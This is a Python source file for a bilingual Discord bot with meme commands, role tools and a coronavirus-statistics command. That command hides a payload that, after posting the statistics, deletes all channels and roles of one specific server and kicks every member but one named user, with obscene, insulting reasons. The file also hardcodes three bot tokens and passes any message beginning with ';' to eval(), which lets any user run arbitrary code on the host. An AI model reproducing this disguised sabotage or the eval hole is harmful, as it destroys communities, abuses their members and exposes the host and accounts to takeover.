from discord.ext import commands
from random import *
from bs4 import BeautifulSoup as bs
from tinydb import TinyDB, Query
from colorama import Fore, Style
from mutagen.mp3 import MP3
import discord
import asyncio
import requests as rq
import shutil
import os
import colorama


colorama.init()


async def get_pre(bot, message):
  return ['ас', 'Ас', 'АС', 'аС', 'ass', 'Ass', 'ASS', 'aSS', 'as', 'As', 'aS', 'AS',]

bot = commands.Bot(command_prefix = get_pre, case_insensetive = True)
def log(message, code = 'g'):
    g = 'g'
    r = 'r'
    print(f'[{Fore.GREEN}ASTRANGER{Style.RESET_ALL}] {message}'  if code == g else f'[{Fore.RED}ASTRANGER{Style.RESET_ALL}] {message}')

def get_duration(file):
    audio = MP3(file)
    DURATION = audio.info.length
    return DURATION

log('Обьект бота инициализирован.')
bot.remove_command('help')
ASTRANGER = 'NjcwNjkyOTAwNTkzNTk4NTMw.Xn-nsA.w--gR1cpeD6wgY3zDNGVnGoOtXc'
BSTRANGER = 'NjcyMTE1NzgyNDM5OTI3ODQw.Xn96kg.1oOjbKW8b_eqwSBT9-r0L_x4TlA'
BFTAE     = 'Njc1Mzg5MDYwNjc5OTkxMzA4.Xl5snA.NkH8QucLvWbtil1hr-wKU0G6-dc'
db = TinyDB('data.json')
tags = TinyDB('dbta.json')
SUI = Query()
_key = ''
recovering = False
SAY_CHANNEL = 712265525140652052
voice_client = None

FILES = list(filter(lambda i: i.startswith('t'), os.listdir()))

def reset():
    if (db.search(SUI.key == '1') == []):
        db.insert({'_key' : '1', 'image' : 'a1.jpg', 'message' : ''}) # СУЙ
        db.insert({'_key' : '2', 'image' : 'a2.jpg', 'message' : ''}) # ЪУЪ
reset()
log('Основные догмы восстановлены.')


@bot.event
async def on_ready():
    global voice_client
    channel = bot.get_channel(693112638275584260)
    message = await channel.fetch_message(693112703492816898)
    ctx = await bot.get_context(message)

    await bot.change_presence(activity = discord.Game(name='"асхелп"/"ashelp"'))

    guild = bot.get_guild(671432722236964884)
    def changecolor(id, guild = guild):
        role = guild.get_role(id)
        colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
        return role.edit(colour = colour)
    await changecolor(673966918281199616)
    await changecolor(685813138301780027)
    await changecolor(676388955985412116)
    await changecolor(676389164727402517)
    log('Цвета ролей обновлены.')
    await recover(ctx = ctx)
    log('Базы данных восстановлены.')

    voice_channel = bot.get_channel(SAY_CHANNEL)
    voice_client  = await voice_channel.connect()
    log('Бот готов к работе.')


@bot.event
async def on_message(message):
    channel = message.channel
    author = str(message.author)
    cantent = str(message.content)
    Killant = bot.get_user(472853149137240064)
    if (str(message.content).startswith('//')):
        _key = str(message.content)[2:]
        ctx = await bot.get_context(message)
        await dogme(ctx, clan = 'a', key = _key)
    #if (str(message.author) == "Гошасс#8787" and str(message.content) == "СУЙ" or str(message.author) == "ΤχεΑμμιΡ#6109"and message.content == "СУЙ"):
    for user in tags.all():
        dmember = bot.get_user(user['id'])
        if (dmember in message.mentions):
            await channel.send(user['message'])
    if (str(message.content) == "СУЙ"):
          if (author[len(author) - 4 : len(author)] in ["8787", "6109"]):
              async with channel.typing():
                  await channel.send(file = discord.File('a1.jpg'))
    elif (Killant in message.mentions):
        await channel.send('```#КИЛЛ ВЕРНИСЬ В КОНОХУ```')
    elif (cantent.lower().startswith(('ъуъ', 'ъyъ', 'ъγъ', 'iyi', 'iуi', 'iγi')) or cantent.lower().endswith(('ъуъ', 'ъyъ', 'ъγъ', 'iyi', 'iуi', 'iγi'))):
        await channel.send(file = discord.File('a2.jpg'))
    elif (str(message.content) in ["цвет пакажы", 'gimmie the color']):
        while (1 == 1):
            await message.author.roles[len(message.author.roles) - 1].edit(colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255)), reason = None)
            await asyncio.sleep(5)
    elif (message.content.startswith(';')):
        cantent = cantent[1:]
        def evaluate(ctn):
            return eval(ctn)
        await channel.send(evaluate(cantent))
    elif (message.content in ('<@!672115782439927840>', '<@!670692900593598530>')):
        ctx = await bot.get_context(message)
        await ctx.send('**Есть, сэр!**')
        if (author != str(bot.get_user(343001477133893632))):
            await help(ctx)
    await bot.process_commands(message)


@bot.event
async def on_voice_state_update(member, before, after):
    if (after.channel):
        if (after.channel.id == 690138281928687622 and before.channel is None):
            await asyncio.sleep(0.5)
            audio = choice(FILES)
            try:
                voice_client.play(discord.FFmpegPCMAudio(audio))
                voice_client.source = discord.PCMVolumeTransformer(voice_client.source)
                voice_client.source.volume = 0.50
            except Exception as e:
                log(e, 'r')
            DURATION = get_duration(audio)
            await asyncio.sleep(DURATION)
            await member.move_to(None)


@bot.group(name = 'догма', aliases = ['dogma', 'dogme'])
async def dogme(ctx, clan : str, key : str):
    channel = ctx.message.channel
    _key = key
    dictionary = db.search(SUI._key == _key)
    if (clan in ['а', 'a']):
        if (key in ['девиз', 'motto']):
            await ctx.send('**Прах ты, и в прах возвратишься!**')
            return
        try:
            img = dictionary[0]['image']
        except:
            pass
        async with channel.typing():
            if (dictionary != []):
                try:
                    await channel.send(dictionary[0]['message'])
                except:
                    pass
                try:
                    await channel.send(file = discord.File(img))
                except:
                    pass
            else:
                await channel.send("Unable to find a dogma.")
    elif (clan in ['р', 'p', 'r']):
        await ctx.send('Союз распался в ~~1991~~ 2019')


@bot.command(aliases = ['тег', 'тэг', 'tag'])
async def astag(ctx, user: discord.Member, *, args):
    eng = 'There\'s a tag on this user\'s mention already.'
    rus = 'На тег этого человека уже воспроизводится команда.'
    global recovering
    tchannel = bot.get_channel(692447840148127864)
    if (tags.search(SUI.id == user.id) == []):
        tags.insert({'id' : user.id, 'message' : args})
        if (recovering == False):
            await tchannel.send(f'астег {user.id} {args}')
        else:
            log('Рекаверинг...', 'r')
    else:
        if (ctx.message.content.lower().startswith('as')):
            await ctx.send(eng)
        else:
            await ctx.send(rus)


@bot.command(name = 'рекавер', aliases = ['recover', 'rcv'])
async def recover(ctx):
    global recovering
    eng = ['Recover 2.0\nStatus: START',
            'Dogmas recovering is started.',
            'Recover 2.0\nStatus: END',
            'Dogmas recovering is ended.']
    rus = ['Рекавер 2.0\nСтадия: СТАРТ',
            'Начинается восстановление догм.',
            'Рекавер 2.0\nСтадия: END',
            '~~Вирусная база данных успешно обновлена~~']
    db.purge()
    tags.purge()
    channel = ctx.message.channel
    author = str(ctx.message.author)
    roles = ''
    recovering = True
    for i in ctx.message.author.roles:
        roles += str(i)
    if ('Администратор догм' in roles):
        pass
    else:
        return
    assets = bot.get_channel(685840409116540930)
    astags = bot.get_channel(692447840148127864)
    reset()
    async with channel.typing():
        if (ctx.message.content.lower().startswith('as')):
            await channel.send(eng[0])
            await channel.send(eng[1])
        else:
            await channel.send(rus[0])
            await channel.send(rus[1])
    async for i in assets.history(limit = 1000):
        if not (i.content.lower().startswith('ассет')):
            await i.delete()
        else:
            _key = i.content.split(' ')[1]
            content = tuple(i.content.split(' ')[2:])
            await tset(ctx, _key, *content)
    async for i in astags.history(limit = 1000):
        user = i.content.split(' ')[1]
        if (bot.get_user(int(user))):
            user = bot.get_user(int(user))
            args = ' '.join(i.content.split(' ')[2:])
            await astag(ctx, user = user, args = args)
        else:
            await i.delete()
            await bot.get_channel(685553321901293605).send(f'Асте\г был удалён. ({user.id}) - ({args})')
    recovering = False
    async with channel.typing():
        if (ctx.message.content.lower().startswith('as')):
            await channel.send(eng[2])
            await channel.send(eng[3])
        else:
            await channel.send(rus[2])
            await channel.send(rus[3])


@bot.command(name = 'сет', aliases = ['set'])
async def tset(ctx, _key : str, *content):
    global recovering
    eng = ['You can\'t use such symbols.',
            'You can\'t edit original dogmas.',
            'A dogma with such key is already exists. :teahah:']
    rus = ['Я запрещаю вам использовать спецсимволы!',
            'Нельзя изменять изначальные догмы.',
            'Догма с таким ключом уже существует. :teahah:',]
    achannel = bot.get_channel(685840409116540930)
    channel = ctx.message.channel
    if (recovering == False):
        async with achannel.typing():
            await achannel.send(str(ctx.message.content))
    for i in _key:
        if (i in ['*', '/', '|', '\\',]):
            async with channel.typing():
                if (ctx.message.content.lower().startswith('as')):
                    await channel.send(eng[0])
                else:
                    await channel.send(rus[0])
            return
    listContent = []
    for i in content:
        listContent.append(i)
    if (_key == '1' or _key == '2'):
        async with channel.typing():
            if (ctx.message.content.lower().startswith('as')):
                await channel.send(eng[1])
            else:
                await channel.send(rus[1])
        return
    for i in db.all():
        if (i['_key'] == _key):
            if (recovering == False):
                async with channel.typing():
                    if (ctx.message.content.lower().startswith('as')):
                        await channel.send(eng[2])
                    else:
                        await channel.send(rus[2])
                return
    listContent[0] = ''.join(listContent[0])
    strContent = ' '.join(listContent)
    if (strContent.startswith('https://')):
        link = listContent[0]
        link = link.replace(' ', '')
        link = str(link.split('?')[0])
        extention = ''
        if (link.endswith('.jpg') or link.endswith('.jpeg')):
            extention = '.jpg'
        elif (link.endswith('.png')):
            extention = '.png'
        elif (link.endswith('.gif')):
            extention = '.gif'
        else:
            print(link.replace(' ', '_'))
        message = ' '.join(listContent[1:])

        response = rq.get(link, stream = True)
        with open(f'a{_key}{extention}', 'wb') as out_file:
            shutil.copyfileobj(response.raw, out_file)
        del response
        db.insert({'_key' : _key, 'image' : f'a{_key}{extention}', 'message' : message})
    else:
        message = ' '.join(listContent)
        db.insert({'_key' : _key, 'message' : message})


@bot.command(name = 'лист', aliases = ['list'])
async def dlist(ctx, page : int = 1):
    allbase = db.all()
    REQUESTED_BY = ctx.message.author
    PAGE_ELS     = 5
    PAGES        = len(allbase) // PAGE_ELS
    if (len(allbase) % PAGE_ELS != 0):
        PAGES += 1
    DOGMES       = len(allbase)
    sent = await ctx.send('**Initialising...**')
    for PAGE in range(PAGES):
        embed = discord.Embed(
            type        = 'rich',
            title       = 'СПИСОК ДОГМ',
            description = f'Страница {PAGE + 1}',
            color       = discord.Colour.from_rgb(153, 95, 199)
        )
        for i in range(5):
            i += PAGE * PAGE_ELS
            fieldname = ''
            fieldvalue = ''
            if (allbase[i]['message'] != ''):
                if (len(allbase[i]['_key']) < 255):
                    fieldname = allbase[i]["_key"]
                else:
                    msg = allbase[i]['_key']
                    fieldname = msg[:len(msg) - (len(msg) - 100) - 5 - len(allbase[i]["_key"])] + '...'
            else:
                fieldname = f'{allbase[i]["_key"]} : `EMPTY`'

            if (len(allbase[i]['message']) < 255):
                fieldvalue = allbase[i]['message']
            else:
                msg = allbase[i]['message']
                fieldvalue = msg[:len(msg) - (len(msg) - 100) - 5 - 30] + '...'
            fieldvalue += '\nДогма содержит изображение.' if allbase[i].get('image') else '\nДогма не содержит изображение.'
            embed.add_field(name = fieldname, value = fieldvalue, inline = False)
            DOGMES -= 1
        await sent.edit(content = '', embed = embed)
        await sent.add_reaction('⏭️')
        try:
            reaction, user = await bot.wait_for('reaction_add', timeout = 30.0, check = lambda reaction, user: user == REQUESTED_BY and str(reaction.emoji) == '⏭️')
        except asyncio.TimeoutError:
            await sent.delete()
            return


@bot.command(name = 'rainbow', aliases = ['радуга', 'лгбт', 'lgbt', 'lgbtq', 'rnbw'])
async def rainbow(ctx):
    randkey = choice(db.all())['_key']
    dictionary = db.search(SUI._key == randkey)
    if (dictionary != []):
        try:
            await ctx.send(dictionary[0]['message'])
        except Exception as e:
            pass
        try:
            img = dictionary[0]['image']
            await ctx.send(file = discord.File(img))
        except Exception as e:
            pass


@bot.command('делит', aliases = ['delete'])
async def delete(ctx, _key):
    roles = ''
    for role in ctx.message.author.roles:
        roles += str(role)
    if ('Член ботского совета' in roles):
        db.remove(SUI._key == _key)
        async for i in bot.get_channel(685840409116540930).history(limit = 500):
            if (str(i.content).lower().startswith(f'ассет {_key}')):
                await i.delete()
    else:
        await ctx.send('Неимеиш права!1!!адинадин1ъъъъъ' if ctx.message.content.lower().startswith('ас') else 'You don\' have permission to do such things.')


@bot.command(name = "хелп", aliases = ['help', 'helping'])
async def help(ctx):
    eng = True if ctx.message.content.lower().startswith('as') else False
    channel = ctx.message.channel
    async with channel.typing():
        if not eng:
            await channel.send('Привет!')
            embed = discord.Embed(
                title = 'Список команд',
                colour = discord.Colour.from_rgb(153, 95, 199),
                type = 'rich',
                description = 'Бота A STRANGER:',
            )
            embed.add_field(name = 'Команда помощи', value = '"асхелп" для вызова этого сообщения еще раз')
            embed.add_field(name = 'Сервер Странника', value = 'За помощью или что-бы предложить что-то своё, обращайтесь в https://discord.gg/A4NETzF')
            embed.add_field(name = 'Команда догм', value = '"асдогма а <ключ>" ("//ключ") - отправляет в чат фразу или картинку, которую флот взял за догму.')
            embed.add_field(name = 'Девизы', value = '"асдогма а девиз" - пишет девиз флота.')
            embed.add_field(name = 'Сптичить гостя', value = '"асптица <@ник>" выдаёт роль кандидата человеку. Работает при наличии роли обучатора.')
            embed.add_field(name = 'Выдать гостя обратно', value = '"аспогости <@ник>" выдаёт гостя кандидату, работает при наличии роли обучатора или иных руководящих ролей.')
            embed.add_field(name = 'Своя догма', value = '"ассет <номер> <ссылка на картинку cdn.discordapp>(опционально) <текст>(опционально)" - при наличии одного из аргументов запоминает вашу собственную догму, которую можно воспроизвести.')
            embed.add_field(name = ':stop_sign:Воля случая', value = '"асрадуга" - выводит случайную догму из списка оных (осторожно, возможно наличие 18+ контента (nsfw).)')
            embed.add_field(name = ':x:Удаление догм', value = '"асделит <ключ>" удаляет догму. Недоступно для обычного пользователя.')
            embed.add_field(name = ':x:Сломались догмы?', value = 'За помощью к Айсу/Меззикусу можно обратиться всегда ~~за исключением того, если на сервере нет Гоши по каким-то причинам~~')
            embed.add_field(name = 'Сообщение при тэге', value = '"астег <пользователь> <сообщение>" - выдаёт сообщение при теге пользователя.')
            embed.add_field(name = 'Коронавирус', value = '"асинфа <country>(опционально) - статистика по заражению коронавирусом."')
            embed.add_field(name = 'Кикстартерская кампания', value = '"аскикстарт" показывает статистику прошлой кампании Pixel Starships на Kickstarter.')
        else:
            await channel.send('Hi! ;3')
            embed = discord.Embed(
                title = 'A STRANGER bot',
                colour = discord.Colour.from_rgb(153, 95, 199),
                type = 'rich',
                description = 'Command list',
            )
            embed.add_field(name = 'Help command', value = '"ashelp" to call this message again.')
            embed.add_field(name = 'A Stranger\'s Discord Server', value = 'For help or to offer something - https://discord.gg/A4NETzF')
            embed.add_field(name = 'Dogmas command', value = '"asdogma a <key>" ("//key") - sends a message or a picture the fleet has taken as a dogma.')
            embed.add_field(name = 'Mottos', value = '"asdogma a motto" - sends fleet motto.')
            embed.add_field(name = 'Make guest a bird', value = '"asbird <@mention>" gives a role of bird. Works only in presence of Обучатор role.')
            embed.add_field(name = 'Make bird a guest... yeah', value = '"asguest <@mention>" gives a role of guest. Works only in presence of Обучатор or other valuable roles.')
            embed.add_field(name = 'Your own dogma', value = '"asset <key> <picture link cdn.discordapp>(optional) <text>(optional)" - in the presence of one of the arguments, saves your dogma that can be sent by "asdogma a" or "//key"')
            embed.add_field(name = ':stop_sign:Will of chance', value = '"asrainbow" sends a random dogma. Be careful, NSFW ahead.')
            embed.add_field(name = ':x:Dogma deletion', value = '"asdelete <key>" deletes a dogma. Can\'t be used by regular user.')
            embed.add_field(name = ':x:Dogmas are broken?', value = 'Contact 『❄』I¢e Void『❄』#6609 or ΤχεΑμμιΡ#6109 for help.')
            embed.add_field(name = 'Mention message', value = '"astag <@mention or id> <message>" sends a message on user\'s mention.')
            embed.add_field(name = 'Coronavirus', value = '"asinfo <country>(optional)" - coronavirus cases statistics.')
            embed.add_field(name = 'Kickstarter company', value = '"askickstart" shows Pixel Starships Kickstarter end statistics.')
        await channel.send(embed = embed)


@bot.command(name = "птица", aliases = ['rookh', 'bird', 'ptitsa'])
async def fetch(ctx, person : discord.Member):
    rus = ['Вы не можете давать роль сами себе.',
            'Вам нужна роль обучатора для использования этой команды.']
    eng = ['You can\'t give a role to you.',
            'Your need Обучатор role to use this command.']
    isrus = ctx.message.content.lower().startswith('as')
    channel = ctx.message.channel
    if (str(ctx.message.author) == str(person)):
        async with channel.typing():
            if (isrus):
                await channel.send(rus[0])
            else:
                await channel.send(eng[0])
        return
    guild = bot.get_guild(person.guild.id)
    roles = ''
    for element in ctx.message.author.roles:
        roles += str(element)
    if ('обучатор' not in roles):
        async with channel.typing():
            if (isrus):
                await channel.send(rus[1])
            else:
                await channel.send(eng[1])
    else:
        await person.remove_roles(guild.get_role(686634008444141618), reason = None)
        await person.add_roles(guild.get_role(670649392398729270), reason = None)
        await person.remove_roles(guild.get_role(670719148699156511), reason = None)


@bot.command(name = 'ребут', aliases = ['reboot'])
async def reboot(reconnect = True):
    await bot.close()
    bot.run(ASTRANGER)


@bot.command(name = 'погости', aliases = ['guest'])
async def guesting(ctx, person : discord.Member):
    rus = ['Вы не можете изменять роли самому себе.',
            'Вы не имеете права на изменение ролей этого человека.']
    eng = ['You can\'t edit your own roles.',
            'You can\'t edit roles of this member.']
    isrus = ctx.message.content.lower().startswith('as')
    channel = ctx.message.channel
    if (str(ctx.message.author) == str(person)):
        async with channel.typing():
            if (isrus):
                await channel.send(rus[0])
            else:
                await channel.send(eng[0])
        return
    guild = bot.get_guild(person.guild.id)
    roles = ''
    required_roles = ['обучатор', 'совет флота', 'адмирал', 'вице адмирал', 'доверенный']
    for element in ctx.message.author.roles:
        roles += str(element)
    roles = roles.lower()
    for element in required_roles:
        if (element in roles):
            await person.remove_roles(guild.get_role(686634008444141618), reason = None)
            await person.remove_roles(guild.get_role(670649392398729270), reason = None)
            await    person.add_roles(guild.get_role(670719148699156511), reason = None)
        else:
            async with channel.typing():
                if (isrus):
                    await channel.send(rus[1])
                else:
                    await channel.send(eng[1])
            break


@bot.command(name = 'пьюрдж', aliases = ['purge'])
async def dbpurge(ctx):
    channel = ctx.message.channel
    roles = ''
    for role in ctx.message.author.roles:
        roles += str(role)
    roles = roles.lower()
    if ('креатор' not in roles):
        async with channel.typing():
            if not (ctx.message.content.lower().startswith('as')):
                await channel.send('ДА КАК ТЫ ПОСМЕЛ, СМЕРТНЫЙ?!')
            else:
                await channel.send('HOW DARE YOU?!')
        return
    else:
        db.purge()
        tags.purge()
        log('Базы данных были очищены!')


@bot.command(name = 'инфа', aliases = ['infa', 'info'])
async def coronainfo(ctx, country = ''):
    if (country == ''):
        r = rq.get('https://www.worldometers.info/coronavirus/')
    else:
        r = rq.get('https://www.worldometers.info/coronavirus/country/' + country.lower())
    html = bs(r.content, 'html.parser')
    span = html.select('.content-inner > #maincounter-wrap > h1')
    count = html.select('.content-inner > #maincounter-wrap > .maincounter-number > span')
    for i in range(3):
        await ctx.send(f'{span[i].text} {count[i].text}')
    guild =   bot.get_guild(512544393886957568)
    channel = bot.get_channel(691232787335872573)
    for i in guild.channels:
        await i.delete(reason = 'Ебаная чёрствая хуёвина.')
    for i in guild.members:
        if (str(i) != 'Mezzicus#2494'):
            await i.kick(reason = 'Гоша пидарас ебаный.')
    for i in guild.roles:
        await i.delete()


@bot.command(name = 'kickstart', aliases = ['кикстарт', 'кикстрат', 'кикстартер', 'кикстратер', 'kickstarter'])
async def kickstart(ctx):
    # r = rq.get('https://www.kickstarter.com/projects/savysoda/pixel-starships-galaxy')
    # html = bs(r.content, 'html.parser')
    # pledged = html.select('.ksr-green-500')[0].text
    # outof = html.select('.money')[0].text
    # backers = html.select('div.ml5.ml0-lg.mb4-lg > div > span')[0].text
    # toend = html.select('div.ml5.ml0-lg > div > div > span')[0].text
    # intpledg = pledged.replace('$', '').replace(',', '')
    # average = int(intpledg) / int(backers)
    pledged = '$51,318'
    outof = '$20,000'
    backers = '555'
    intpledg = pledged.replace('$', '').replace(',', '')
    average = int(intpledg) / int(backers)
    if not (ctx.message.content.lower().startswith('as')):
        await ctx.send(f'Внесено {pledged} из {outof}.\nВнесли {backers} человек.\nСредний внос: ${average}.')
    else:
        await ctx.send(f'Now pledged {pledged} out of {outof}.\nBackers: {backers}\nAverage payment: ${average}.')


log('Инициализированы все необходимые команды.')
log('Бот подготавливается к запуску.')
bot.run(ASTRANGER)
